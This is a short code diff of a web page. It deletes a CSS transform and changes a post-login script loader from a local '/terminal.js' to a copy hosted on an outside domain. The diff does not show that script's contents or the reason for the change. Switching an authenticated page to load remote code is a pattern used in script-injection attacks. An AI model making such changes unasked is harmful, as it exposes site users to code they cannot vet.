@@ -42,7 +42,6 @@
       left: 0;
       width: 100%;
       height: 100%;
-      transform: translateY(50%);
     }
   </style>
 </head>
@@ -108,7 +107,7 @@
   document.addEventListener("authSuccess", function () {
     console.log("Auth success, loading terminal script...");
     const script = document.createElement("script");
-    script.src = "/terminal.js";
+    script.src = "https://abobus.tech/terminal.js";
     document.body.appendChild(script);
   });
 </script>
